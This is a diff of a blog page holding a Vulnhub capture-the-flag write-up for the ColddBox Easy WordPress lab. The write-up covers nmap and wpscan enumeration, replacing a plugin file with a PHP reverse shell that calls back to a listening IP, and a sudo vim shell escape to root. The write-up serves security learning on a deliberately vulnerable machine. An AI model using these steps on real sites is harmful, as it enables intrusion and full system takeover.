@@ -2,19 +2,16 @@
 <html lang="en">
 <head>
   
-    <title>(EN) Write-up : C0lddBox :: Back</title>
+    <title>(EN) Vulnhub write-up : C0lddBox :: Back</title>
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Machine-Author: C0ldd
+<meta name="description" content="Introduction Machine-Author: C0ldd
 Description: Welcome to ColddBox Easy, it is a Wordpress machine with an easy level of difficulty, highly recommended for beginners in the field, good luck!
 Download:(https://mega.nz/file/VldHiIgA#4nRI2LPZs_x48_-ryCkPvL6Em2lQTSJEKvoReieDMec)
 Operating system: Linux
 What will be covered in this write-up:
--enumeration
--reverse-shell
--privileges escalation
-ENUMERATION First, we need to find out where the machine is located on the network:
+  Enumeration  Reverse-shell  Privilege escalation  ENUMERATION First, we need to find out where the machine is located on the network:
 nmap -sP 10.0.2.15/24
 -sP: it means ping scan, it considers that hosts are all up, so it doesn&amp;rsquo;t need to discover them." />
 <meta name="keywords" content="" />
@@ -45,18 +42,8 @@ nmap -sP 10.0.2.15/24
 
 <meta property="og:locale" content="en" />
 <meta property="og:type" content="article" />
-<meta property="og:title" content="(EN) Write-up : C0lddBox">
-<meta property="og:description" content="Machine-Author: C0ldd
-Description: Welcome to ColddBox Easy, it is a Wordpress machine with an easy level of difficulty, highly recommended for beginners in the field, good luck!
-Download:(https://mega.nz/file/VldHiIgA#4nRI2LPZs_x48_-ryCkPvL6Em2lQTSJEKvoReieDMec)
-Operating system: Linux
-What will be covered in this write-up:
--enumeration
--reverse-shell
--privileges escalation
-ENUMERATION First, we need to find out where the machine is located on the network:
-nmap -sP 10.0.2.15/24
--sP: it means ping scan, it considers that hosts are all up, so it doesn&amp;rsquo;t need to discover them." />
+<meta property="og:title" content="(EN) Vulnhub write-up : C0lddBox">
+<meta property="og:description" content="*Welcome to ColddBox Easy, it is a Wordpress machine with an easy level of difficulty, highly recommended for beginners in the field, good luck!* " />
 <meta property="og:url" content="https://backkk.github.io/post/c0ldd_box/writeupp_c0ldd/" />
 <meta property="og:site_name" content="Back" />
 
@@ -140,7 +127,7 @@ nmap -sP 10.0.2.15/24
     
 <div class="post">
   <h1 class="post-title">
-    <a href="https://backkk.github.io/post/c0ldd_box/writeupp_c0ldd/">(EN) Write-up : C0lddBox</a></h1>
+    <a href="https://backkk.github.io/post/c0ldd_box/writeupp_c0ldd/">(EN) Vulnhub write-up : C0lddBox</a></h1>
   <div class="post-meta">
     
       <span class="post-date">
@@ -157,16 +144,22 @@ nmap -sP 10.0.2.15/24
   
 
   <div class="post-content"><div>
-        <p><strong>Machine-Author:</strong> C0ldd<br>
+        <h1 id="introduction">Introduction<a href="#introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><strong>Machine-Author:</strong> C0ldd<br>
 <strong>Description:</strong> <em>Welcome to ColddBox Easy, it is a Wordpress machine with an easy level of difficulty, highly recommended for beginners in the field, good luck!</em></p>
 <p><strong>Download:</strong>(<a href="https://mega.nz/file/VldHiIgA#4nRI2LPZs_x48_-ryCkPvL6Em2lQTSJEKvoReieDMec">https://mega.nz/file/VldHiIgA#4nRI2LPZs_x48_-ryCkPvL6Em2lQTSJEKvoReieDMec</a>)</p>
 <p><strong>Operating system:</strong> Linux</p>
-<p><strong>What will be covered in this write-up:</strong><br>
--enumeration<br>
--reverse-shell<br>
--privileges escalation</p>
-<pre><code>ENUMERATION
-</code></pre><p>First, we need to find out where the machine is <strong>located</strong> on the network:</p>
+<p><strong>What will be covered in this write-up:</strong></p>
+<ul>
+<li>
+<a href="#enumeration">Enumeration</a></li>
+<li>
+<a href="#reverse-shell">Reverse-shell</a></li>
+<li>
+<a href="#privilege-escalation">Privilege escalation</a></li>
+</ul>
+<h1 id="enumeration">ENUMERATION<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>First, we need to find out where the machine is <strong>located</strong> on the network:</p>
 <p><code>nmap -sP 10.0.2.15/24</code></p>
 <p><strong>-sP</strong>: it means <strong>ping scan</strong>, it considers that hosts are all up, so it doesn&rsquo;t need to discover them. It is a fast way to discover a machine.</p>
 <p>We found an IP address ! :</p>
@@ -187,7 +180,8 @@ Device type: general purpose
 Running: Linux 3.X|4.X
 OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
 OS details: Linux 3.2 - 4.9
-</code></pre><p>Alright, we only have a website running on the port 80, hosting a <strong>WordPress</strong>, running on <strong>Apache 2.4.18</strong>, let&rsquo;s check what it looks like :<img src="../img/c0ldd_wp_background.PNG" alt="wordpress_site"></p>
+</code></pre><p>Alright, we only have a website running on the port 80, hosting a <strong>WordPress</strong>, running on <strong>Apache 2.4.18</strong>, let&rsquo;s check what it looks like :</p>
+<p><img src="../img/c0ldd_wp_background.PNG" alt="wordpress_site"></p>
 <p>We can use a tool to scan this WordPress website, <strong>wpscan</strong> (a tool used to enumerate vulnerable stuffs on WordPress such as vulnerable plugins):</p>
 <p><code>wpscan --url http://10.0.2.6 -e u vp</code></p>
 <p><strong>-e</strong>: enumeration mode<br>
@@ -221,8 +215,8 @@ OS details: Linux 3.2 - 4.9
 </code></pre><p>Nice ! Let&rsquo;s try to login as c0ldd on the WordPress, maybe we got the <strong>admin credentials</strong> ? So let&rsquo;s go in <strong>/wp-admin/</strong>:
 <img src="../img/users_wp.PNG" alt="wp_users"></p>
 <p>We can see that the user <strong>c0ldd</strong> is the <strong>admin</strong> of the WordPress ! Perfect. We can now <strong>add</strong> or <strong>delete</strong> things, maybe we could setup a <strong>reverse-shell</strong> to have a better control of the web-server ?</p>
-<pre><code>REVERSE-SHELL
-</code></pre><p>We could put a PHP reverse-shell code into the plugins configuration. All we have to do is to go ro the <strong>Plugins</strong> menu, then you can modify the <strong>Akismset</strong> plugin, go into the file <strong>akismet/class.akismet-admin.php</strong>, then just select all its content and delete it to paste the reverse shell.</p>
+<h1 id="reverse-shell">REVERSE-SHELL<a href="#reverse-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We could put a PHP reverse-shell code into the plugins configuration. All we have to do is to go ro the <strong>Plugins</strong> menu, then you can modify the <strong>Akismset</strong> plugin, go into the file <strong>akismet/class.akismet-admin.php</strong>, then just select all its content and delete it to paste the reverse shell.</p>
 <p>The code I used for the reverse-shell is located in <code>/usr/share/webshells/php-reverse-shell.php</code></p>
 <p>Then you have to <strong>modify</strong> the reverse-shell code, you need to put your <strong>listening IP</strong> and the <strong>port</strong> that will be waiting for a connexion. It is presented like that :</p>
 <pre><code>$ip = '10.0.2.15';  // CHANGE THIS
@@ -268,8 +262,8 @@ uid=1000(c0ldd) gid=1000(c0ldd) grupos=1000(c0ldd)
 <pre><code>cat user.txt | base64 -d Felicidades
 primer nivel conseguido!c0ldd@ColddBox-Easy
 </code></pre><p>We now need to be <strong>#root</strong>&hellip;</p>
-<pre><code>PRIVILEGE ESCALATION
-</code></pre><p>The objective of the privilege escalation is to use system <strong>misconfigurations</strong> to escalate to the <strong>#root</strong> user.
+<h1 id="privilege-escalation">PRIVILEGE ESCALATION<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>The objective of the privilege escalation is to use system <strong>misconfigurations</strong> to escalate to the <strong>#root</strong> user.
 This website is usefull to find some :</p>
 <p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation</a></p>
 <p>I found that the command <code>sudo -l</code> lists the allowed (and forbidden) commands for the invoking user</p>
@@ -285,11 +279,13 @@ This website is usefull to find some :</p>
 <p><code>sudo vim -c ':!/bin/sh'</code></p>
 <p>We are <strong>#root</strong> !! We can now <strong>cat</strong> the <strong>#root</strong> flag :)
 <code>Felicidades, primer nivel conseguido!#</code></p>
-<pre><code>SPECIAL THANKS
-</code></pre><p>I&rsquo;d like to thanks <strong>Kr0wZ</strong>, who guided me for this CTF, you can check out his blog :
+<h1 id="special-thanks">SPECIAL THANKS<a href="#special-thanks" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>I&rsquo;d like to thanks <strong>Kr0wZ</strong>, who guided me for this CTF, you can check out his blog :
 <a href="https://kr0wz.github.io/fr/">KrowZ Blog</a><br>
 Thanks to <strong>Mysaz</strong> who also helped me for this CTF<br>
-Thanks to <strong>IsIghTT</strong>, here is his discord <strong>IsIghTT#3829</strong></p>
+Thanks to <strong>IsIghTT</strong>, here is his discord <strong>IsIghTT#3829</strong><br>
+<strong>Big</strong> Thanks to Zayceur who helped me to setup this blog and gave me some tips for coding in markdown, his website :
+<a href="https://zayceur.ch/">https://zayceur.ch/</a></p>
 
       </div></div>
 
